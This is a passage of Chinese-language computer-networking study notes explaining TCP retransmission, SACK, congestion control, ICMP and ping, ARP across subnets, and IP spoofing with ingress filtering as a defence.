<h4 id="🌟-4-2-快速重传（重复-ACK-触发）">🌟 4.2 快速重传（重复 ACK 触发）</h4>
<ul>
<li>A 发段 1~5，段 3 丢了</li>
<li>B 收到段 4、5 后，发现中间缺段 3，会一直发 <strong>ACK=3072</strong>（想告诉对方“我等段3”）</li>
<li>A 连续收到 3 个 ACK=3072，就快速重传段3（不用等超时）</li>
</ul>
<h4 id="🌟-4-3-SACK-与-D-SACK（可选项）">🌟 4.3 SACK 与 D-SACK（可选项）</h4>
<ul>
<li>B 可以告诉 A：“我收到了段1、2、4、5，缺段3”</li>
<li>这样 A 就精准地知道只补发段 3，不会重发其他的</li>
</ul>
<h3 id="✅-5-流量控制（接收方控制发送方）">✅ 5. 流量控制（接收方控制发送方）</h3>
<p>每个 ACK 报文里会告诉发送方当前缓冲区还剩多少，例如：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ACK</span>=<span class="number">3072</span>, Window=<span class="number">8192</span>   // 表示我还能接收<span class="number">8</span>KB数据</span><br></pre></td></tr></table></figure>
<ul>
<li>A 一次最多发 8KB 数据，再多就得等 B 缓冲区腾出来</li>
<li>避免 B 来不及处理导致丢包</li>
</ul>
<h3 id="✅-6-拥塞控制（网络状态控制发送速率）">✅ 6. 拥塞控制（网络状态控制发送速率）</h3>
<blockquote>
<p>和流量控制不同，<strong>拥塞控制是网络的“健康检查”</strong></p>
</blockquote>
<h4 id="初始状态：">初始状态：</h4>
<ul>
<li>A 一开始不知道网络是否拥堵，采用慢启动算法，从 1KB 开始发，每收到 ACK，就加倍发送量：</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1KB</span> → <span class="number">2</span>KB → <span class="number">4</span>KB → <span class="number">8</span>KB ...</span><br></pre></td></tr></table></figure>
<h4 id="发生丢包：">发生丢包：</h4>
<ul>
<li>说明网络压力大，A 就会<strong>减速</strong>（进入拥塞避免或快恢复阶段）</li>
<li>后续每次增加一点点（线性增长）：</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">8KB</span> → <span class="number">9</span>KB → <span class="number">10</span>KB ...</span><br></pre></td></tr></table></figure>
<h4 id="拥塞窗口-滑动窗口：">拥塞窗口 + 滑动窗口：</h4>
<ul>
<li>最终的发送速率 = min(拥塞窗口，滑动窗口)</li>
<li>同时考虑网络状况 + 接收能力</li>
</ul>
<h3 id="✅-SACK（Selective-ACK，选择性确认）">✅ SACK（Selective ACK，选择性确认）</h3>
<blockquote>
<p><strong>解决</strong>：告诉发送方：我虽然中间有段没收到，但其他非连续段我收到了！</p>
</blockquote>
<h4 id="🌟-举个例子：">🌟 举个例子：</h4>
<p>客户端发送了段：</p>
<ul>
<li>段1（0~1023）</li>
<li>段2（1024~2047）❌ 丢了</li>
<li>段3（2048~3071）</li>
<li>段4（3072~4095）</li>
</ul>
<p><code>ACK</code>：接收方只能发送 <code>ACK=1024</code>（等段2），但其实它收到了段3和段4，这个信息无法表达出来，之后发送方还会重发段3和段4。</p>
<blockquote>
<p><strong>如果开启 SACK 选项，接收方会这样发回：</strong></p>
</blockquote>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ACK</span> <span class="string">=</span> <span class="number">1024</span>   <span class="string">``SACK</span> <span class="string">Block</span> <span class="string">=</span> [<span class="number">2048</span>, <span class="number">4096</span><span class="string">)</span>  <span class="string">→</span> <span class="string">意思是我收到了段3和段4</span></span><br></pre></td></tr></table></figure>
<p>于是发送方就知道只需要重发段2，不会重复重发段3和段4。</p>
<h3 id="✅-D-SACK（Duplicate-SACK）">✅ D-SACK（Duplicate SACK）</h3>
<blockquote>
<p><strong>增强型 SACK</strong>：在确认非连续段的同时，还告诉你——我收到了<strong>重复的段</strong></p>
</blockquote>
<h4 id="🌟-举个例子：-2">🌟 举个例子：</h4>
<p>假设段2 重发了两次，结果收到了两份。接收方会告诉你：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ACK</span> <span class="string">=</span> <span class="number">4096</span>   <span class="string">``SACK</span> <span class="string">Block</span> <span class="number">1</span> <span class="string">=</span> [<span class="number">1024</span>, <span class="number">2048</span><span class="string">)</span>   <span class="string">//</span> <span class="string">表示我收到了段2（即便重复）</span>   <span class="string">``SACK</span> <span class="string">Block</span> <span class="number">2</span> <span class="string">=</span> [<span class="number">2048</span>, <span class="number">4096</span><span class="string">)</span>   <span class="string">//</span> <span class="string">表示我也收到了段3和4</span></span><br></pre></td></tr></table></figure>
<p>通过 D-SACK，发送方可以知道：</p>
<ul>
<li>哦，原来段2其实我第一次发的时候就到了，是我的 ACK 没到，导致我多发了一次。</li>
</ul>
<p>这样发送方就可以<strong>优化传输策略、避免误判为拥塞而减速</strong>。</p>
<h2 id="TCP的拥塞控制">TCP的拥塞控制</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTk2OTA3YWY3NzNkYTZjZDgwMGIwNmVkOTRhMWE2ZDlfVWl3dGtoYVd1WW9NdkNINk5tZ0tHS2UzbW1obDBwYWNfVG9rZW46SXVSUWJhM2FwbzNKRUl4YXlTQmNvUHNEbmFkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzQxMmE5NGYxNzE5NWRlOTY2MDZkOTI3MGJkMWUwOTNfUkdOQzRJZFAyR040Rk1scVVXZjI0ZmRNMU94bGZhelpfVG9rZW46SGl3d2JzVHc0b2ZxdFZ4TmUzMWNmclZMbjllXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTM5YTQ1ZmUxMzdjNjVhZjlmZDYxMzhkY2UyMmI0NDlfb2ZyTmQ0a01ON3J5ZXRsTU9ycVJHU3Y1R0ZpTnVBdlFfVG9rZW46TmVNNWIzcWN1b3VqaEJ4YzRQeGNCcUlUbkhoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🎯-图中各阶段编号解析（按顺序）">🎯 图中各阶段编号解析（按顺序）</h2>
<h3 id="📍-阶段-1：慢开始-拥塞避免-过渡">📍 阶段 1：<strong>慢开始</strong> <strong>+</strong> <strong>拥塞避免****过渡</strong></h3>
<ul>
<li><code>cwnd = 1</code> 开始，每收到一个 ACK，<code>cwnd</code> <strong>翻倍</strong></li>
<li>cwnd 变化：1 → 2 → 4 → 8 → 16（达到 <code>ssthresh=16</code>）</li>
<li>达到 ssthresh 后，<strong>进入拥塞避免阶段</strong></li>
</ul>
<blockquote>
<p><strong>关键点：</strong></p>
<ul>
<li><code>ssthresh</code>（慢开始门限）是判断是否处于“慢开始”的关键变量</li>
<li>小于 ssthresh → 翻倍；大于等于 → 每 RTT 线性加 1</li>
</ul>
</blockquote>
<h3 id="📍-阶段-2：超时重传（Timeout）">📍 阶段 2：<strong>超时重传（Timeout）</strong></h3>
<ul>
<li>到 <code>cwnd = 24</code> 时，发生 <strong>超时</strong>（说明网络拥塞严重）</li>
<li>TCP 的反应：
<ul>
<li><code>ssthresh = cwnd / 2 = 12</code></li>
<li><code>cwnd = 1</code>（重新慢启动）</li>
</ul>
</li>
</ul>
<blockquote>
<p>🧠 <strong>为什么回到 1？</strong></p>
<ul>
<li>超时是最严重的信号，说明网络已经严重堵了，因此要“保守地重来一次”</li>
</ul>
</blockquote>
<h3 id="📍-阶段-3：再次慢启动-拥塞避免">📍 阶段 3：<strong>再次慢启动 + 拥塞避免</strong></h3>
<ul>
<li>重新慢启动到达 <code>cwnd = 12</code>，之后进入拥塞避免阶段（线性增长）</li>
</ul>
<h3 id="📍-阶段-4：3-次重复-ACK（触发-Fast-Retransmit）">📍 阶段 4：<strong>3 次重复 ACK（触发 Fast Retransmit）</strong></h3>
<ul>
<li>假设发送了一个段丢失（例如 seq=20），但后续的数据到了</li>
<li>接收方发现乱序，就不断重复 ACK 期望的数据（比如重复 ACK 20）</li>
<li>发送方收到 <strong>3 个重复 ACK</strong>，触发 <strong>快速重传</strong></li>
</ul>
<h3 id="📍-阶段-5：快恢复-（Fast-Recovery）">📍 阶段 5：<strong>快恢复</strong>**（Fast Recovery）**</h3>
<ul>
<li>TCP Reno 的反应：
<ul>
<li><code>ssthresh = cwnd / 2 = 12</code></li>
<li><code>cwnd = ssthresh = 12</code></li>
<li>不回到1！而是直接退半，进入“拥塞避免”</li>
<li>接下来每收到一个 ACK，<code>cwnd</code> 线性加 1</li>
</ul>
</li>
</ul>
<h2 id="ARQ协议（停止等待ARQ、连续ARQ、选择重传ARQ）">ARQ协议（停止等待ARQ、连续ARQ、选择重传ARQ）</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ODMxOTZlYjRhZTI5NTk5MTYyYjgxMjVjOTBkYjA0ZjFfbEk1YUhUWWVnYnoyTGVubVBmalVOcGc4VkpPWlkxQ2tfVG9rZW46T21PZ2I1cGxxb1ZrOXJ4WGM2dmN1dUJwbjBkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Q0ZDExOTljN2QzNzk4MzgzOWJhMWY2MDQzNmU5MTBfVkhlZVc4MDJGZkhsR01icmRTM0ZrMHFNMFRWUW1tNDVfVG9rZW46QVM3TGI0N2U2b04zYlB4ODlzeGNrNHRGbkxkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ODZkNjNhODk4MWRmYTY2MzJjNDI4ZmYzNGIzYjY1MTNfeWRLQlN4a1BOYVZLN2tXNlc0NnpjMUhtajV1MmprcFVfVG9rZW46VDhpSmJneWJxb21JMU14UXBKbWNhSlZEbkZiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MjEwNTg3MjMwMjg4OWE4N2U5ZDdhNjkzZTQ4N2NjZjdfVWpTUUUwZUZhRG1QcERFSVZ0cUo3ZUZVNGRGczVaZnhfVG9rZW46VXFQRmJlNkNGb2VsT0F4Qk0zVmNQZGtTbjdjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDRiZDMxYWZhMWRiNWQwZWRkNDk5YjQ5ZWVkYzQ5MmVfbkozVkVwWFBSTWRRVmlzdVNyZFU5NVVCUkdQSEFSbjRfVG9rZW46QTlNcmJIblZCb1Y0ajV4aUZENmNNZzB3bjliXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="IPv6、IPv4">IPv6、IPv4</h2>
<p>IPv6 除了地址空间极大（128 位）外，还有很多提升：</p>
<p>1）支持无状态地址自动配置（SLAAC），设备插网线自动生成全局唯一地址，无需 DHCP；</p>
<p>2）不再依赖 NAT，每个设备可拥有公网 IP，支持端到端通信；</p>
<p>3）简化了报文头结构，转发处理更高效；</p>
<p>4）采用扩展头机制，实现协议灵活拓展；</p>
<p>5）ICMPv6 增强，集成了邻居发现、MTU 探测等，提升网络适应能力。</p>
<p>这些特性让 IPv6 更适合现代互联网设备增长、移动办公与物联网部署等场景。</p>
<h3 id="ICMP是什么">ICMP是什么</h3>
<p>ICMP（Internet Control Message Protocol，互联网控制报文协议）是 <strong>TCP/IP 协议族中的一个网络层协议</strong>，主要作用是：</p>
<blockquote>
<p>🔧 <strong>帮助主机和路由器报告网络通信中的错误情况和交换网络状态信息</strong>。</p>
</blockquote>
<p>它不是用来传输数据的，而是为 IP 提供<strong>差错报告与网络诊断功能</strong>，是 <strong>IP 协议的辅助协议</strong>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MmI0ZmM2MThmYjk3OGRlNWRhOTdlNGY1Y2ZkY2Q4NDBfaEh6MzNiYTdxVFhkaExhZjRUQTI3M0Nqa3FVVTZIUjlfVG9rZW46WWV4TWJvQzByb1JReDJ4cDIwYWNIV01sblljXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>通过一个<strong>详细的 ICMP 报文示例</strong>，讲解它是如何工作的，尤其是我们日常最常用的 <code>ping</code> 命令场景：</p>
<h2 id="✅-场景：使用-ping-命令检测目标主机是否连通">✅ 场景：使用 <code>ping</code> 命令检测目标主机是否连通</h2>
<p>假设你在自己的电脑上执行：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ping</span> <span class="number">192.168.1.1</span></span><br></pre></td></tr></table></figure>
<h2 id="🧱-Step-by-Step-过程分析：">🧱 Step-by-Step 过程分析：</h2>
<h3 id="1、你电脑构造一个-ICMP-Echo-Request-报文">1、你电脑构造一个 <strong>ICMP Echo Request 报文</strong></h3>
<ul>
<li>类型：<strong>8（Echo Request）</strong></li>
<li>代码：0</li>
<li>序列号、标识符：用于区分多个请求</li>
<li>数据：可以是任意数据（例如 32 字节）</li>
</ul>
<p>📦 报文格式（简化）：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+-----------+--------+----------------+--------+ ``| <span class="type">Type</span> = <span class="number">8</span>  | <span class="type">Code</span>=<span class="number">0</span> | <span class="type">Checksum</span>       | <span class="type">ID</span>/<span class="type">Seq</span> | ``+-----------+--------+----------------+--------+ ``| <span class="type">Payload</span>（如：<span class="string">&quot;abcdefghijklmnopqrstuvwabcdefghi&quot;</span>） | ``+--------------------------------------------------+</span><br></pre></td></tr></table></figure>
<h3 id="2、将报文封装到-IP-数据包并发送">2、将报文封装到 IP 数据包并发送</h3>
<ul>
<li>源 IP：你本机 IP，例如 <code>192.168.1.100</code></li>
<li>目标 IP：<code>192.168.1.1</code></li>
<li>协议号：1（代表 ICMP）</li>
</ul>
<h3 id="3、路由器将包传输给目标主机（192-168-1-1）">3、路由器将包传输给目标主机（192.168.1.1）</h3>
<p>目标主机接收到后，识别出这是一个 <strong>ICMP Echo 请求</strong>。</p>
<h3 id="4、目标主机构造并发送-ICMP-Echo-Reply-报文">4、目标主机构造并发送 <strong>ICMP Echo Reply 报文</strong></h3>
<ul>
<li>类型：<strong>0（Echo Reply）</strong></li>
<li>Code: 0</li>
<li>同样的 ID 和 Seq</li>
<li>返回相同的 Payload 内容</li>
</ul>
<p>📦 Echo Reply 报文结构与 Echo Request 类似，只是 Type 为 0。</p>
<h3 id="5、你收到-ICMP-Echo-Reply-后终端显示：">5、你收到 ICMP Echo Reply 后终端显示：</h3>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reply <span class="keyword">from</span> 192.168.1.1: <span class="attribute">bytes</span>=32 <span class="attribute">time</span>=2ms <span class="attribute">TTL</span>=64</span><br></pre></td></tr></table></figure>
<p>表示：</p>
<ul>
<li>你收到了 32 字节的回复数据</li>
<li>往返耗时为 2ms</li>
<li>TTL 为 64（可推测目标主机是 Linux 系统）</li>
</ul>
<h2 id="📈-多个-ICMP-报文往返">📈 多个 ICMP 报文往返</h2>
<p>ping 会默认发送 4 个 Echo Request，每个得到 Echo Reply 后打印一行输出，最后统计平均 RTT、丢包率等信息。</p>
<h2 id="🧠-补充细节：">🧠 补充细节：</h2>
<h3 id="🚫-如果-ping-不通，会发生什么？">🚫 如果 ping 不通，会发生什么？</h3>
<ul>
<li>网络中断、主机不可达：目标不会返回 Echo Reply</li>
<li>TTL 超时：中间路由器会返回 <strong>ICMP 类型 11（Time Exceeded）</strong></li>
<li>无此路由：ICMP 类型 3（Destination Unreachable）</li>
</ul>
<h2 id="ARP协议">ARP协议</h2>
<h3 id="ARP-协议解决了什么问题？">ARP 协议解决了什么问题？</h3>
<p>ARP 协议，全称 <strong>地址解析协议（Address Resolution Protocol）</strong>，它解决的是网络层地址和链路层地址之间的转换问题。因为一个 IP 数据报在物理上传输的过程中，总是需要知道下一跳（物理上的下一个目的地）该去往何处，但 IP 地址属于逻辑地址，而 MAC 地址才是物理地址，ARP 协议解决了 IP 地址转 MAC 地址的一些问题。</p>
<h2 id="✅-一、ARP-协议要解决什么问题？">✅ 一、ARP 协议要解决什么问题？</h2>
<p>ARP（Address Resolution Protocol）解决的是：</p>
<blockquote>
<p><strong>已知 IP 地址，如何获取对应的 MAC 地址？</strong></p>
</blockquote>
<p>因为：</p>
<ul>
<li>IP 地址是<strong>逻辑地址</strong>，用于网络层的寻址。</li>
<li>MAC 地址是<strong>物理地址</strong>，用于链路层的局域网通信。</li>
</ul>
<p>但网络中真正能在网线或 Wi-Fi 上传输的是 MAC 地址。</p>
<p>所以每次发送数据前，都需要 <strong>通过 ARP 协议把目标 IP 地址解析成 MAC 地址</strong>。</p>
<h2 id="✅-二、举个例子（主机-A-给主机-B-发数据）">✅ 二、举个例子（主机 A 给主机 B 发数据）</h2>
<p>假设：</p>
<ul>
<li>主机 A 的 IP 是 <code>192.168.1.1</code>，MAC 是 <code>AA-AA-AA-AA-AA-AA</code></li>
<li>主机 B 的 IP 是 <code>192.168.1.2</code>，MAC 是 <code>BB-BB-BB-BB-BB-BB</code></li>
</ul>
<p>现在，<strong>A 想向 B 发送一个数据包</strong>，流程如下：</p>
<h3 id="🔵-第一步：A-查找-ARP-缓存表">🔵 第一步：A 查找 ARP 缓存表</h3>
<p>A 先查一下自己电脑里有没有 <code>192.168.1.2</code> 对应的 MAC 地址。</p>
<ul>
<li>如果有，就可以直接发送。</li>
<li>如果没有，<strong>就触发 ARP 请求广播</strong>。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWU5N2Y1YjFjMmZhNjQzYjY4ZDlmMDBkOTZmN2Q3MmNfN0kwSmNKY2RGcTI0ajVCUnh3ZWpGa0MySWlackFuZ0RfVG9rZW46SjBhMGJFMnNub2dvSlV4aEJqZmNFMDdybkJnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="🔵-第四步：A-使用目标-MAC-构造真正的数据包并发送">🔵 第四步：A 使用目标 MAC 构造真正的数据包并发送</h3>
<p>此时 A 就能正式构造一个以太网数据帧：</p>
<ul>
<li>源 MAC：<code>AA-AA-AA-AA-AA-AA</code></li>
<li>目标 MAC：<code>BB-BB-BB-BB-BB-BB</code></li>
<li>负载数据：IP 包、TCP 包等</li>
</ul>
<h2 id="✅-三、总结">✅ 三、总结</h2>
<p>ARP 协议的本质是：</p>
<blockquote>
<p><strong>在一个局域网中，将 IP 地址映射为 MAC 地址，以便可以通过链路层发送数据帧。</strong></p>
</blockquote>
<h2 id="✅-补充知识：ARP-表">✅ 补充知识：ARP 表</h2>
<p>每台设备维护一张 ARP 表，用于缓存 IP 与 MAC 的映射关系，避免每次都广播。条目一般有过期时间（如 20 分钟）。</p>
<h3 id="不同局域网之间通信的-ARP">不同局域网之间通信的 ARP</h3>
<h2 id="✅-场景：主机-A-与主机-B-不在一个局域网">✅ 场景：主机 A 与主机 B 不在一个局域网</h2>
<h3 id="网络拓扑：">网络拓扑：</h3>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[主机 <span class="symbol">A</span>]<span class="string">` `</span><span class="symbol">IP</span>: <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span>   <span class="string">``</span>网关: <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>   <span class="string">``</span><span class="symbol">MAC</span>: <span class="symbol">AA</span>-<span class="symbol">AA</span>-<span class="symbol">AA</span>-<span class="symbol">AA</span>-<span class="symbol">AA</span>-<span class="symbol">AA</span> <span class="string">``</span> <span class="string">``</span>        │ <span class="string">``</span>        ▼<span class="string">` `</span>[ 路由器 <span class="symbol">R</span> ]<span class="string">` `</span><span class="symbol">LAN</span> 口 <span class="symbol">IP</span>: <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>，<span class="symbol">MAC</span>: <span class="symbol">R1</span>-<span class="symbol">R1</span>-<span class="symbol">R1</span>-<span class="symbol">R1</span>-<span class="symbol">R1</span>-<span class="symbol">R1</span>   <span class="string">``</span><span class="symbol">WAN</span> 口 <span class="symbol">IP</span>: <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>，<span class="symbol">MAC</span>: <span class="symbol">R2</span>-<span class="symbol">R2</span>-<span class="symbol">R2</span>-<span class="symbol">R2</span>-<span class="symbol">R2</span>-<span class="symbol">R2</span> <span class="string">``</span> <span class="string">``</span>        │ <span class="string">``</span>        ▼<span class="string">` `</span>[主机 <span class="symbol">B</span>]<span class="string">` `</span><span class="symbol">IP</span>: <span class="number">10.0</span><span class="number">.0</span><span class="number">.20</span>   <span class="string">``</span><span class="symbol">MAC</span>: <span class="symbol">BB</span>-<span class="symbol">BB</span>-<span class="symbol">BB</span>-<span class="symbol">BB</span>-<span class="symbol">BB</span>-<span class="symbol">BB</span></span><br></pre></td></tr></table></figure>
<h2 id="✅-主机-A-想给主机-B-发数据，该怎么做？">✅ 主机 A 想给主机 B 发数据，该怎么做？</h2>
<h3 id="🔵-第一步：主机-A-发现-B-不在同一网段">🔵 第一步：主机 A 发现 B 不在同一网段</h3>
<ul>
<li>A 的子网是 <code>192.168.1.0/24</code></li>
<li>B 的 IP 是 <code>10.0.0.20</code>，不在这个网段</li>
</ul>
<p>A 发现目标 IP <code>10.0.0.20</code> <strong>不是同网段主机</strong>，就不会直接发送给 B，而是：</p>
<blockquote>
<p><strong>将数据包发给自己的默认网关 192.168.1.1，也就是路由器 LAN 口。</strong></p>
</blockquote>
<h3 id="🔵-第二步：主机-A-需要路由器的-MAC-地址，发-ARP-请求">🔵 第二步：主机 A 需要路由器的 MAC 地址，发 ARP 请求</h3>
<p>A 查 ARP 表，没有 192.168.1.1 的 MAC 地址 → 发起 ARP 请求：</p>
<blockquote>
<p>“谁是 <code>192.168.1.1</code>？请告诉我你的 MAC 地址。”</p>
</blockquote>
<p>路由器 LAN 口回应自己的 MAC：</p>
<blockquote>
<p>“我（192.168.1.1）的 MAC 是 <code>R1-R1-R1-R1-R1-R1</code>。”</p>
</blockquote>
<p>A 记录该地址。</p>
<h3 id="🔵-第三步：A-构造帧发给网关">🔵 第三步：A 构造帧发给网关</h3>
<ul>
<li>源 MAC：<code>AA-AA-AA-AA-AA-AA</code></li>
<li>目标 MAC：<code>R1-R1-R1-R1-R1-R1</code></li>
<li>IP 头中目标 IP：<code>10.0.0.20</code></li>
</ul>
<p>A 把这个包发给路由器。</p>
<h3 id="🔵-第四步：路由器查路由表-→-找到出接口（WAN）">🔵 第四步：路由器查路由表 → 找到出接口（WAN）</h3>
<p>路由器查看目标 IP <code>10.0.0.20</code>，发现要走它的 WAN 口。</p>
<p>但此时它也可能不知道 <code>10.0.0.20</code> 的 MAC，怎么办？</p>
<blockquote>
<p>路由器会在 WAN 口上再发一个 ARP 请求：</p>
<p>“谁是 <code>10.0.0.20</code>？请告诉我你的 MAC 地址。”</p>
</blockquote>
<h3 id="🔵-第五步：主机-B-回复-MAC，通信建立">🔵 第五步：主机 B 回复 MAC，通信建立</h3>
<p>B 回复自己的 MAC 地址：<code>BB-BB-BB-BB-BB-BB</code>。</p>
<p>于是：</p>
<ul>
<li>路由器通过 WAN 口把包发给 B；</li>
<li>后续所有通信，B 都把响应包发给网关（即路由器的 WAN IP）；</li>
<li>路由器再转发给主机 A。</li>
</ul>
<h2 id="✅-关键点回顾：">✅ 关键点回顾：</h2>
<ul>
<li><strong>ARP 只在局域网内广播有效</strong></li>
<li>不同网段之间通信必须经过路由器转发</li>
<li>每跳之间都需要 ARP 来获取下一跳 MAC</li>
</ul>
<ol>
<li>主机 A 查询 ARP 表，期望寻找到目标路由器的本子网接口的 MAC 地址。</li>
</ol>
<p>​     目标路由器指的是，根据目的主机 B 的 IP 地址，分析出 B 所在的子网，能够把报      文转发到 B 所在子网的那个路由器。</p>
<ol>
<li>主机 A 未能找到目标路由器的本子网接口的 MAC 地址，将采用 ARP 协议，问询到该 MAC 地址，由于目标接口与主机 A 在同一个子网内，该过程与同一局域网内的 MAC 寻址相同。</li>
<li>主机 A 获取到目标接口的 MAC 地址，先构造 IP 数据报，其中源 IP 是 A 的 IP 地址，目的 IP 地址是 B 的 IP 地址，再构造链路层帧，其中源 MAC 地址是 A 的 MAC 地址，目的 MAC 地址是<strong>本子网内与路由器连接的接口的 MAC 地址</strong>。主机 A 将把这个链路层帧，以单播的方式，发送给目标接口。</li>
<li>目标接口接收到了主机 A 发过来的链路层帧，解析，根据目的 IP 地址，查询转发表，将该 IP 数据报转发到与主机 B 所在子网相连的接口上。</li>
</ol>
<p>​     到此，该帧已经从主机 A 所在的子网，转移到了主机 B 所在的子网了。</p>
<ol>
<li>路由器接口查询 ARP 表，期望寻找到主机 B 的 MAC 地址。</li>
<li>路由器接口如未能找到主机 B 的 MAC 地址，将采用 ARP 协议，广播问询，单播响应，获取到主机 B 的 MAC 地址。</li>
<li>路由器接口将对 IP 数据报重新封装成链路层帧，目标 MAC 地址为主机 B 的 MAC 地址，单播发送，直到目的地。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">主机 A： 目的 IP 不在本地网段 → 把包交给网关  </span><br><span class="line">↓  </span><br><span class="line">主机 A：发 ARP 请求，获取网关 MAC  </span><br><span class="line">↓  </span><br><span class="line">主机 A：把帧发送给网关  </span><br><span class="line">↓  </span><br><span class="line">路由器：查路由表，发 ARP，请求目标 MAC  </span><br><span class="line">↓  </span><br><span class="line">目标主机回应 MAC → 路由器转发  </span><br><span class="line">↓  </span><br><span class="line">主机 A 与 B 通信成功</span><br></pre></td></tr></table></figure>
<h2 id="网络攻击">网络攻击</h2>
<h3 id="IP欺骗、入口过滤、出口过滤">IP欺骗、入口过滤、出口过滤</h3>
<p>IP 欺骗技术就是伪造某台主机的 IP 地址的技术。通过 IP 地址的伪装使得某台主机能够伪装另外的一台主机，而这台主机往往具有某种特权或者被另外的主机所信任。</p>
<h2 id="🌐-一、IP-欺骗是什么？">🌐 一、IP 欺骗是什么？</h2>
<p><strong>IP 欺骗（IP Spoofing）</strong> 指的是攻击者在发送数据包时伪造源 IP 地址，使其看起来像是来自其他合法的主机。这种方式常用于：</p>
<ul>
<li>绕过访问控制（伪装成可信 IP）</li>
<li>发起 DDoS 攻击（隐藏真实来源）</li>
<li>钓鱼、会话劫持等攻击场景</li>
</ul>
<p><strong>防范 IP 欺骗（IP Spoofing）攻击</strong> 的一种重要手段 —— <strong>入口过滤（Ingress Filtering）</strong> 和 <strong>出口过滤（Egress Filtering）</strong></p>
<h2 id="🚧-二、如何防范？——入口过滤和出口过滤">🚧 二、如何防范？——入口过滤和出口过滤</h2>
<h3 id="✅-1-入口过滤（Ingress-Filtering）">✅ 1. 入口过滤（Ingress Filtering）</h3>
<blockquote>
<p><strong>目的：</strong> 阻止“伪造源 IP”的外部数据包进入本地网络。</p>
</blockquote>
<h4 id="✅-举例：-2">✅ 举例：</h4>
<p>假设你是中国某高校的网络管理员，你的校园网 IP 段是 <code>10.0.0.0/8</code>（私有地址）。</p>
<p>现在有一个数据包从公网进入你学校路由器，<strong>但它的源 IP 是</strong> <strong><code>10.0.1.15</code></strong>，这是你的校园网内的地址。</p>
<blockquote>
<p>❗ 问题：这个数据包源 IP 是你网段的，但它却是从公网发来的，这显然是不合理的，可能是某个攻击者伪造的。</p>
